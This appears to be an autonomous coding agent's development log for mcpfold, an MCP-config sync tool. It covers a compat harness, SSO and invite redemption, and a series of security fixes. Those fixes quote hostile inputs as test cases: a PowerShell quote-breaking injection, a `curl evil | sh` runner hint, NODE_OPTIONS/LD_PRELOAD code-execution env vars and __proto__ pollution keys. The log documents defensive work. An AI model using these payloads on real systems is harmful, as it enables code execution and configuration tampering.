  finding (`checkNativeEnvFallback`) explaining which server and why.
- **Round-trip**: `envRefCanonicalizer` derives each dialect's inverse from the dialect itself and
  reverses it on parse (factory adapters + the two bespoke ones), so `import`/drift reconstructs the
  canonical `${env:NAME}`.
- **Leak proof**: the S9.1 harness gains a native-env pass asserting the resolved SENTINEL value
  reaches ZERO artifacts across all 7 supporting adapters (only the placeholder name is written).

Tests: per-dialect render + round-trip (7), bearer→native Authorization header, non-env shim fallback,
per-server override, no-silent-change default, the doctor `info` finding, and the leak-harness
extension. JSON schema regenerated for the two `secretStrategy` fields.

`verify_all` green (eslint + core-purity, typecheck ×10, `pnpm -r test`, `pnpm -r build`, Prettier,
docs:build; demo unchanged). adapters 24 files / core 13 / cli 36 / security 1. Same pre-existing
Windows-only red (`e2e/deploy-env.test.ts`; passes on CI ubuntu).

**Follow-ups:** field-scoped dialects (Roo Code `${env:VAR}` in `args` only; Goose `${VAR}` in remote
headers/uri only) were conservatively left on the shim — revisit if users ask. Version-sensitivity
smoke tests (Copilot CLI `${VAR}` regressed in v0.0.407; Gemini env substitution has lagged docs)
would harden the guarantee.

---

## S19.5 — Adapter-compat harness v2: deep signatures, live evidence, public matrix

Started/done: 2026-07-09. The weekly compat harness compared only top-level/entry KEY shapes against
hand-captured samples — blind to the exact drifts that hit in 2025-26: a value-position change
(Windsurf `serverUrl`, Gemini `httpUrl`) or a path move (Windsurf→Devin). This upgrades it on four
axes. Stacked on S19.4.

- **Deeper signature**: `shapeOf` now collects **remote-entry field keys** separately from stdio
  keys (a URL-shaped entry is classified remote), so `url→serverUrl` / keeping `httpUrl` is
  detectable on its own axis; samples also carry the **resolved path pattern per scope**, so a
  silent path move is flagged. Regression fixtures for the Windsurf/Gemini/path cases. All 18 samples
  recaptured with the deep signature.
- **Live upstream checks**: samples for the four clients with fetchable primary docs (VS Code,
  Cursor, Claude Code, Gemini) carry a `liveUrl`. The scheduled `--live` run confirms those docs
  still document the keys the adapter renders — catching upstream drift, not just our stale samples.
  It never parses HTML into a schema (brittle); a missing key token ⇒ divergent, an unreachable doc
  ⇒ **skipped, never a false pass**. The captured check always runs regardless.
- **Public compat matrix**: `compat/matrix.ts` + `gen-matrix.ts` generate a dated
  **[docs/compat-matrix.md](docs/compat-matrix.md)** (also served on the site under /docs) and
  **apps/site/public/compat-matrix.json** — client × format × scopes × transport × secret-strategy ×
  **last-verified date** (straight from the harness samples, so it's evidence, not hand-edited). CI
  gate (`docs` job) fails if the committed matrix drifts from a re-capture.
- **Richer issue-filing**: the weekly `adapter-compat.yml` runs `--live` and its report now names the
  exact axis (root/entry key, **remote-entry field**, **path move**, or **upstream doc** token), so
  drift triage points at the field, not just "something changed."

Tests: deep-signature regression fixtures (remote-entry split, httpUrl→url, url→serverUrl, path
move), live-check ok/divergent/skipped-never-false-pass, and the matrix module (row derivation +
Markdown render). Generated `compat-matrix.md`/`.json` and the recaptured `samples/` are
prettier-ignored (harness-owned, like fixtures) — fixes the recurring capture-vs-prettier friction.

`verify_all` green (eslint + core-purity, typecheck ×10, `pnpm -r test`, `pnpm -r build`, Prettier,
docs:build + matrix-drift + demo). adapters 25 files / 151 tests. Same pre-existing Windows-only red
(`e2e/deploy-env.test.ts`; passes on CI ubuntu).

**Follow-ups:** a dedicated styled site page (vs the on-site docs page + JSON asset) for the E13/E15
marketing tie-in; the live-doc heuristic is token-presence — a schema-parse path could sharpen it for
clients that publish machine-readable schemas.

## S20.3 — Pending-invite redemption & enterprise SSO

Started/done: 2026-07-09. Two onboarding walls removed: inviting an email with no account used to
404, and there was no SSO. Verified locally against a real Postgres (Docker) + Deno + Playwright.

**Pending invites (backend).** Migration `0008` adds `pending_invites` + `audit_events`
(append-only, server-write-only) + an `auth.users → public.users` provisioning trigger (the missing
signup hook). Inviting an email with no account mints a single-use, expiring, 256-bit token (only its
SHA-256 hash is stored, reusing `lib/codes.ts`); the invitee redeems it after signup. Redemption is
an atomic single-use claim (the `pollDeviceAuth` idiom), **idempotent** for the same user, and
expiry/revoke-enforced. New edge handlers — list / revoke / redeem / events — wired into the router;
each action writes an audit event. **Anti-takeover**: redemption authorizes by the token hash and
binds membership to the authenticated `sub`, never the (non-unique) email.

**Web console.** `teamsApi` gains `listPendingInvites`/`revokeInvite`; `invite()` returns the
one-time token. `TeamConsole` surfaces the shareable invite link + a Pending-invites list with revoke.

**Enterprise SSO.** GoTrue runs the OIDC flow (Entra ID / Okta); mcpfold trusts the GoTrue JWT as
before, so **device-code CLI login keeps working for SSO users unchanged** (the flow verifies the
`sub`, not the auth method — covered by the existing `auth.test.ts` device tests). The mcpfold
linking **policy** (`lib/sso.ts`, `resolveIdentityLink`) makes the identity the durable
**(issuer, subject)** pair: a colliding email — even "verified" — never links to an existing account,
which is the anti-takeover invariant. `docs/self-hosting.md` documents the Entra/Okta GoTrue env
config for hosted + self-hosted, and the critical `GOTRUE_SECURITY_MANUAL_LINKING_ENABLED=false`.

**Audit.** `invite.created` / `invite.redeemed` / `invite.revoked` (+ `member.added`) events, read
via `team-events` (member-scoped RLS).

Tests: a 10-step Deno invite-lifecycle test (mint → provision-trigger → redeem → join, idempotent,
expiry, revoke, non-transferable, audited) + SSO anti-takeover unit tests — **full edge suite 35
passed**; the teams Playwright e2e covers the pending-invite list/link/revoke. Web typecheck + docs
build clean.

**Follow-ups:** per-team IdP selection (this ships deployment-level OIDC config, not per-team) and a
web view of the audit-event log (the `team-events` endpoint exists; the console shows config-version
audit today).

## S22.1 — Fix PowerShell command injection in the Windows keychain provider

Started/done: 2026-07-11. BLOCKER security fix. The win32 keychain provider built its PowerShell
`-Command` string by interpolating the untrusted `account` (and `service`) straight into a
single-quoted `Get-StoredCredential -Target '${service}:${account}'`. A `${keychain:...}` ref such
as `${keychain:x'); Start-Process calc; ('}` closed the quote and executed injected statements —
reachable via a tampered/synced config even on an otherwise-trusted server, since env-channel refs
aren't behind the TOFU gate and secrets resolve at run/test time.

**Fix (out-of-band, injection-proof by construction).** The win32 `-Command` script is now a
CONSTANT that reads the target from env vars: `Get-StoredCredential -Target ($env:MCPFOLD_KC_SERVICE
+ ':' + $env:MCPFOLD_KC_ACCOUNT)`. PowerShell treats env values as opaque string data (never parsed
as code), so the account/service never enter the command text. `keychainCommand` gained an optional
`env` field; the provider threads it through `exec`, and `defaultExec`/`ExecOptions` grew an `env`
option that merges over `process.env` for the child (undefined on POSIX, which already passed the
account as an argv element). Added `-NonInteractive` so a malformed value can never block on a prompt.

**Defense in depth (AC #4).** Tightened core `SECRET_REF_RE` (schema.ts) so a ref path forbids
shell/quote metacharacters — quotes, backtick, `$`, `;`, parentheses, braces, backslash, whitespace
— rejecting an injection payload at schema-validation time. Regenerated the committed
`packages/schema/mcp.config.schema.json` (the `token` pattern) to match.

Tests: win32 argv is a constant regardless of account; an injection-laden account carries no trace
into the executed argv (only into env) and runs exactly one command; a normal account still resolves
on win32 (behavior parity). `verify_all` green — lint, typecheck, full suite (secrets 39, core 92,
schema 9, adapters 151, proxy 54, cli 283, e2e, security), and build all pass.

**Follow-ups:** unify the two secret-ref grammars — `secret-ref.ts`'s loose parsing regexes
(`WHOLE_REF_RE`/`EMBEDDED_REF_RE`) still accept the broader path; converging them with the tightened
`SECRET_REF_RE` is S22.22's scope. The provider is injection-proof independent of that regex.

## S22.2 — Merge into shared-state client files instead of overwriting them

Started/done: 2026-07-11. BLOCKER (data loss). `mcpfold sync` read the target file and passed it as
`existing` to `adapter.render`, but the shared `createMcpServersAdapter` factory and the custom
gemini-cli/vscode renders ignored it and emitted a full replacement. Since claude-code user scope is
`~/.claude.json` (Claude Code's ENTIRE user state — OAuth account, project history, numStartups), zed
is `~/.config/zed/settings.json` (all editor settings), and gemini-cli is `~/.gemini/settings.json`
(auth type, theme), the first sync destroyed every non-MCP key. claude_desktop_config.json can also
hold non-MCP keys (globalShortcut).

**Fix.** New `mergeManagedKeys(existing, keys)` helper in shared.ts does a jsonc-parser
`modify`/`applyEdits` structural edit — replacing only the mcpfold-owned root key(s) and preserving
every other top-level key plus comments/formatting (the same technique opencode/goose/codex already
used). The shared factory (Cursor, Claude Code, Claude Desktop, Zed, + all other mcpServers-style
clients), gemini-cli (`mcpServers`), and vscode (`servers` + `inputs`) now render through it.

**Idempotency.** `sync` decides "unchanged" by byte identity, so first-write and re-fold must use the
same formatter. Rather than a split serialize-vs-merge path (which drifted on the second sync), every
render now always goes through `mergeManagedKeys` (from `{}` when there's no existing file) — and
jsonc-parser `modify` is a fixed point on its own output, so a second sync is byte-identical and
reports `unchanged`. Servers are sorted by name for deterministic output; entry fields are emitted in
construction order (regenerated the 21 mcpServers-style fixture snapshots + the shared.test.ts inline
golden accordingly).

Tests: per-adapter round-trips seeded with real-world extra keys survive a write — claude-code
(numStartups/oauthAccount/projects), zed (theme/buffer_font_size + comments), gemini-cli
(selectedAuthType/theme), vscode ($schema/custom + comments), claude-desktop (globalShortcut); plus a
claude-code idempotence check. `verify_all` green — lint, typecheck, full suite (adapters 158,
cli 283, core, secrets, schema, proxy, e2e, security), and build.

**Follow-ups:** none required for the DoD. VS Code's `inputs` array is treated as fully
mcpfold-managed (replaced wholesale) — a user's hand-authored non-mcpfold input would not survive,
but that matches the prior full-replace behavior and no such case is known.

## S22.3 — Reject __proto__/constructor keys in the core config parser

Started/done: 2026-07-11. HIGH (schema bypass, verified at runtime). `nodeToValue` (load.ts)
reconstructed objects with `obj[key] = …`, so a `__proto__` key invoked the prototype setter instead
of creating an own property. A document whose whole body was nested under `__proto__` loaded as
`ok:true` with zero own keys — the `.strict()` schema fully bypassed and any real servers/profiles
there silently vanished. `detectVersion` read `version` through the prototype chain, and a server
literally named `__proto__` corrupted the servers record.

**Fix.** `loadConfig` now walks the parsed JSONC tree (`findProtoPollutionKey`) for any literal
`__proto__`/`constructor`/`prototype` property key BEFORE reconstruction/validation and returns a
positioned `schema` error (line/column at the offending key). Defense in depth: `nodeToValue` builds
objects with `Object.create(null)`, `serialize.ts` `sortKeysDeep` uses a null-proto accumulator, and
the v1→v2 migration builds its servers record with `Object.create(null)` so a `__proto__`-named
server can't pollute even if reached directly.

Tests (load.test.ts): a `__proto__`-bodied document and a `__proto__`-named server both return
`ok:false` with a `__proto__`-mentioning message; `constructor`/`prototype` keys anywhere are
rejected; a normal config is unaffected and loads with a real (unpolluted) prototype. `verify_all`
green — lint, typecheck, full suite (core 96, + all packages), and build; no false positives from the
scan across the whole workspace.

**Follow-ups:** the scan rejects these three keys anywhere, including inside free-form `env`/`headers`
records — a pathological but theoretically-legitimate env var named `constructor` would be refused.
Accepted as a security-over-flexibility tradeoff per the story's DoD.

## S22.4 — Include env in the TOFU executable signature (NODE_OPTIONS/LD_PRELOAD)

Started/done: 2026-07-11. HIGH (verified). `executableSignature` (trust/tofu.ts) hashed only
command/args/pin, but `run` spawns the child with `{ ...process.env, ...server.env }`. env is a
first-class code-execution channel — `NODE_OPTIONS=--require /evil.js` (any node/npx server),
`LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`, `PYTHONSTARTUP`/`PYTHONPATH`, `BROWSER`. Because env was
outside the signed surface, a synced/tampered config could change a trusted server's env and it ran
with no CHANGED / re-approve gate.

**Fix.** `ExecutableEntry` gains `env`, and `executableSignature` now folds a canonicalized
(key-sorted) form of env into the hash. env is threaded into every entry construction — the run gate
(run.ts), the trust command (trust.ts), and `untrustedServers` (which pull.ts consumes). To preserve
existing trust, env is only added to the hashed object when non-empty: an env-less server keeps its
pre-S22.4 signature (still trusted after upgrade); a server that carries env re-gates once (env was
previously unsigned — desired). We sign the config form of env (secret refs), not resolved values.

Tests (trust.test.ts): adding `NODE_OPTIONS` to a previously-trusted server flips its status to
`changed`; an env value change / env presence changes the signature while key-order does not; an
empty/absent env is byte-identical to the old signature; and `run` refuses to spawn (CHANGED) a
server whose pulled config added `NODE_OPTIONS`, with the spawner never called. `verify_all` green —
lint, typecheck, full suite (cli 283 incl. 14 trust), and build.

**Follow-ups:** none for the DoD. pull's auto-approve of pulled launch commands stays gated behind
integrity verification (a signed config, or explicit --allow-unsigned), so a tampered unsigned config
is refused rather than auto-trusted; the run-path re-gate is the enforcement point.

## S22.5 — Back up the canonical config before pull --yes overwrites it

Started/done: 2026-07-11. HIGH (data loss, verified). `pull` called
`atomicWrite(target, serialize(remote.config))` with no prior `backupIfExists` — unlike every other
canonical-config writer (`migrate.ts`, `sync.ts`, which both back up first). Since `restore` only
enumerates client files via `adapter.resolvePath` per profile and never targets the canonical
`mcp.config.jsonc`, a clobbered canonical config with uncommitted local edits was unrecoverable.

**Fix.** `runPull` now calls `backupIfExists(target, …)` immediately before the `atomicWrite`,
mirroring migrate/sync. The backup path is added to `PullData.backup` and surfaced in the human
output ("Backed up the previous config to …"). The existing injectable `now` clock is reused for a
deterministic backup timestamp. No-ops (backup `null`, no message) on a first-time pull with no local
config.

Tests (cloud.test.ts): a pull over a config carrying an uncommitted local edit writes a backup that
preserves the ORIGINAL contents and surfaces its path; a first-time pull with no local config makes
no backup. `verify_all` green — lint, typecheck, full suite (cli 283 incl. 20 cloud), and build.

**Follow-ups:** AC #3 (teach `restore` to enumerate the canonical file so a pulled overwrite can be
undone in-tool) is explicitly optional and was deferred — it needs a new non-profile target concept
and selection UX. The backup itself uses the standard `.mcpfold.bak.` format and is manually
restorable today; the DoD (never overwrite without a timestamped backup) is met.

## S22.6 — Enforce recursion-depth limits in core traversals (parse/serialize/diff)

Started/done: 2026-07-11. HIGH (DoS, verified). `nodeToValue` (load.ts), `sortKeysDeep` (serialize.ts),
and diff's `semanticEqual` recurse once per nesting level with no cap. A config with ~200k nested
brackets made `loadConfig` throw an uncaught `RangeError: Maximum call stack size exceeded`, violating
the documented no-throw `LoadResult` contract.

**Fix.** Empirically the overflow hits BEFORE reconstruction — `parseTree` itself recurses per level —
so a catch after parsing is insufficient. `loadConfig` now runs `findExcessiveDepthOffset`, an O(n)
iterative scan of the raw text (skipping string contents and line/block comments so their brackets
don't count) that returns a positioned `ok:false` when structural nesting exceeds 64 levels, BEFORE
`parseTree`. Defense in depth: `nodeToValue` carries a depth counter and throws a caught
`MaxNestingError` (→ positioned `ok:false`), and `sortKeysDeep` is depth-capped (which transitively
bounds diff's `semanticEqual`, since it compares through `serialize`). Also fixed a latent bug where
`[].map(sortKeysDeep)`/`[].map(nodeToValue)` passed the array index as the depth arg.

Tests (load.test.ts): 500-level input returns a positioned "too deep" error without throwing;
~200k-level input returns `ok:false` and never throws a RangeError. `verify_all` green — lint,
typecheck, full suite (core 98, + all packages), and build.

**Follow-ups:** none. 64 is ~10× the deepest legitimate config path, so no real config is affected.

## S22.7 — Keep loadConfig's no-throw contract for malformed version numbers

Started/done: 2026-07-11. HIGH (verified). `loadConfig` called `migrateConfig(value, SCHEMA_VERSION)`
with no try/catch whenever `detectVersion(value) < 2`. `detectVersion` reports any number verbatim
(0, negatives, fractionals), and `migrateConfig` loops `while (current < target)` and throws
`MigrationError` when no step has `from === current`. So version 0 and version 1.5 both threw uncaught,
crashing doctor/sync which rely on the documented no-throw `LoadResult`.

**Fix.** `loadConfig` now (1) rejects a non-integer or `< 1` version up front with a positioned
`schema` error (path `version`), before any migration, and (2) wraps the `migrateConfig` call in a
try/catch that converts a `MigrationError` into an `ok:false` positioned error — defense in depth for
any future missing-step gap.

Tests (load.test.ts): version 0, -1, and 1.5 each return `ok:false` (never throw) with a `version`
path; a valid v1 config still auto-migrates to v2 and loads. `verify_all` green — lint, typecheck,
full suite, and build.

## S22.8 — Parse client configs tolerantly (JSONC) and never crash on malformed input

Started/done: 2026-07-11. HIGH (verified). Every adapter `parse()` used `JSON.parse` with no
try/catch (shared factory, gemini-cli, opencode, vscode). VS Code/Cursor `mcp.json`, Claude Code, and
Roo/Cline settings are officially JSONC (comments + trailing commas), so `JSON.parse` threw an uncaught
`SyntaxError` on a valid file — silently skipping its servers on import (import already try/catches per
adapter) and crashing drift detection (`diffRendered` → `parser.parse`).

**Fix.** New `parseClientJsonc` helper (shared.ts) uses jsonc-parser (`allowTrailingComma`, comments
tolerated) and throws a single descriptive `Error` on genuinely malformed input; it replaces
`JSON.parse` in the shared factory + gemini-cli/opencode/vscode parses. New `diffRenderedSafe` util
wraps `diffRendered` at the two client-file drift sites (diff.ts, sync.ts) so a parse failure becomes a
`UsageError` naming the offending file — parser-agnostic, so it also covers codex (TOML) / goose (YAML).
`pull`'s diffRendered compares canonical-vs-canonical (mcpfold-produced JSON), so it is not a
client-file crash surface and was left as-is.

Tests: vscode parses a commented + trailing-comma file and throws `/malformed JSON/` (not a raw
SyntaxError) on corruption; `runDiff` handles a JSONC on-disk cursor file and turns a corrupt one into a
`UsageError` naming `.cursor/...`. `verify_all` green — lint, typecheck, full suite, and build.

**Follow-ups:** import's per-adapter sweep still silently skips a corrupt file (graceful, no crash) —
intentional so one broken client config doesn't abort discovery of all the others.

## S22.9 — Wire package-integrity (SRI) verification end-to-end

Started/done: 2026-07-11. MEDIUM (verified). `trust/integrity.ts` exported `verifyPackageIntegrity` /
`computeIntegrity` but a grep showed they were never called — only `parseIntegrity`, and only to warn
on malformed syntax. The supply-chain control was dead. Separately, `resolve.ts` `toResolved` never
copied `server.integrity` onto `ResolvedServer` (the type lacked the field), so the hash couldn't reach
a fetch/install layer even once verification was wired.

**Fix.** (1) Propagation: `ResolvedServer` gains `integrity?` and `toResolved` sets it from
`server.integrity`. (2) Enforcement: the `--from-mcpb` add path — the one place mcpfold fetches package
bytes — now verifies the fetched bundle against the declared integrity via the shared
`verifyPackageIntegrity` (accepting a registry `fileSha256` as hex or SRI via `toSri`), failing closed
with a clear supply-chain error on a mismatch and a distinct error on a malformed hash. This replaces
the ad-hoc `verifyMcpbIntegrity` call at the install site (the helper stays for its own unit tests).

Tests: integrity survives resolution (resolve.test.ts); a matching hash installs, a mismatch refuses
("integrity check failed"), and a malformed value errors ("not a valid …") — mcpb.test.ts.
`verify_all` green — lint, typecheck, full suite, and build.

**Follow-ups:** npm/pypi registry packages carry an `integrity` from the listing's `fileSha256`, but
mcpfold doesn't fetch their tarballs (npm/uvx do at runtime), so their integrity is recorded for audit
but not byte-verified here — the mcpb bundle path is where mcpfold actually holds the bytes.

## S22.10 — Cap the proxy stdio read buffer and handle stream errors/close

Started/done: 2026-07-11. HIGH + MEDIUM (verified). `streamTransport` (proxy stdio) did
`buffer += chunk` and drained only up to the last newline, with NO maximum — a server (the untrusted
party the proxy exists to contain) could stream gigabytes with no newline and the proxy accumulated it
all (OOM). It also registered only `input.on('data')` — a stream error (EPIPE when the child dies)
became an uncaught exception; `close()` only removed the data listener (never destroyed the stream),
and residual bytes after the final newline were dropped on EOF.

**Fix.** `streamTransport` gained a `maxLineBytes` cap (default 8 MiB): after draining complete lines,
an unterminated remainder past the cap force-closes with an error. It now handles `error`/`end`/`close`
on the input and `error` on the output, wraps `send()` writes in try/catch, and surfaces all of these
through a new optional `MessageTransport.onClose(handler)` (error set on abnormal close, undefined on
clean EOF). `close()` removes every listener and destroys the input stream. A final newline-less
message is delivered on clean EOF instead of dropped. `connectProxy` wires `onClose` from both
transports to a once-guarded disposer, so a crashing/flooding server tears the WHOLE session down
cleanly.

Tests (new proxy/test/stdio.test.ts): an over-cap unterminated flood closes with a "line cap" error and
destroys the stream (bounded memory); a stream `error` surfaces via `onClose` without throwing;
`close()` removes listeners + destroys; a trailing newline-less message is delivered on EOF; a
server-side error tears down both sides via `connectProxy`. `verify_all` green — lint, typecheck, full
suite (proxy 66), and build.

## S22.11 — Validate registry-supplied runtime hints and remote URLs before writing configs

Started/done: 2026-07-11. MEDIUM (security, verified). `runnerFor` (registry/map.ts) ended with
`default: return pkg.runtimeHint ?? 'npx'` — `runtimeHint` is server-controlled data from `server.json`
and flowed directly into `server.command` (the process the client spawns), with only the pinned
package spec as args. A registry entry could set `runtimeHint` to an arbitrary command. `remote.url`
was also written into client configs without checking it is https.

**Fix.** Runners are now whitelisted through `RUNNER_WHITELIST` (npm/npx→npx, pypi/uvx→uvx,
oci/docker→docker); any other `runtimeHint`/`registryType` throws a `UsageError` (with a hint to use
`--from-mcpb` for bundles) rather than being spawned. `mapRemote` requires an `https://` URL before
writing a remote endpoint into a client config.

Tests (registry.test.ts): a hostile `runtimeHint` (`sh -c "curl evil | sh"`) and an unsupported
registryType (`mcpb`) are rejected as unsupported runners; a non-https remote url is rejected. The
prior mcpb-integrity test was retargeted to `npm` (the hex→SRI conversion is type-agnostic, and mcpb is
no longer a mapped stdio runner). `verify_all` green — lint, typecheck, full suite, and build.

**Follow-ups:** cargo/nuget/mcpb registry packages are now rejected by `--from-registry` (they never
produced a working runner before — the command was the bogus literal type). mcpb listings should be
installed via `add --from-mcpb`.

## S22.12 — Close proxy tool-filter bypasses (notification-form call, alias/case)

Started/done: 2026-07-11. MEDIUM (security, verified). Two bypasses of the curation proxy's tool
deny/allow filter: (1) proxy.ts gated the `tools/call` rejection on `message.id !== undefined`, so a
`tools/call` sent as a NOTIFICATION (no id) skipped `!isToolAllowed` and was forwarded to the server —
a blocked tool executed fire-and-forget. (2) `isToolAllowed` used exact `list.includes(name)`, so a
deny-listed tool the server also honors under a different case/whitespace spelling (`FOO`, `foo `)
passed the filter.

**Fix.** (1) The `tools/call` guard now runs whenever the method is `tools/call` regardless of id; a
blocked request still gets an error response, and a blocked notification (no id to answer) is dropped —
either way it never reaches the server. Audit `callStart` only records when there is an id. (2)
`isToolAllowed` normalizes both the directive list and the queried name via `trim().toLowerCase()`, so
the `tools/list` filter and the `tools/call` guard agree by construction and a case/whitespace variant
is blocked.

Tests: filter.test.ts covers case/whitespace normalization for allow + deny; passthrough.test.ts
covers a notification-form denied call (not forwarded), a request-form denied call (error, not
forwarded), a case/whitespace variant (blocked), and an allowed call still forwarding in both forms.
`verify_all` green — lint, typecheck, full suite (proxy 68), and build.

## S21.4 / S21.5 / S21.6 — BLOCKED (E21 web/marketing, autonomous sandbox limits)

2026-07-11. These three E21 stories are blocked for autonomous completion in this environment; the
loop moves past them to the completable E22 security backlog per the blocked-handling protocol.

- **S21.4 (token-cost leaderboard)** requires COLLECTED (not estimated) tool-schema data — launching
  each directory MCP server live via the proxy to capture `tools/list`. Many servers need credentials
  and network/npm access that isn't available here, and the story explicitly warns that estimated or
  fabricated numbers destroy the asset's credibility. Producing the leaderboard/JSON-LD/calculator
  presets honestly needs a session with live-server + credential access. Not faking the data.
- **S21.5 (web funnel instrumentation + channel attribution)** needs a production analytics backend
  and attribution/config decisions (which provider, event taxonomy, consent) that are product/infra
  calls, not autonomous code changes.
- **S21.6 (e2e for the calculator + new comparison pages)** is coupled to the new pages S21.4 would
  create; without them there is nothing new to e2e beyond the existing calculator.

Unblock by running a focused session with live-server/credential access (S21.4), the site's analytics
configuration (S21.5), then S21.6 once the new pages exist.
